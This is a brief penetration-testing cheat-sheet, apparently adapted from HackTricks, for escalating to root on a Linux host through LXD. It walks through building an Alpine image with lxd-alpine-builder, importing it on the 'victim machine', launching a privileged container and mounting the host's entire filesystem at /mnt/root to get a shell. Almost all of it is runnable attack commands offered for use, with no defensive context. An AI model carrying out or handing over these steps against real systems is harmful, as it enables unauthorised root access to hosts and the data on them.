# lxd priv esc without painful build problems
Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.

## lxd priv esc x64
> git clone https://github.com/saghul/lxd-alpine-builder
There is a container image that comes with this. Try it.

## lxd priv esc x86
(hacktricks)
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686
```

## lxd priv esc victim
(hacktricks)
- import the image
- before running the image, start and configure the lxd storage pool as default
- run the image
- mount the /root into the image
- interact with the container
```
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

lxd init

lxc init myimage mycontainer -c security.privileged=true

lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

lxc start mycontainer
lxc exec mycontainer /bin/sh
```
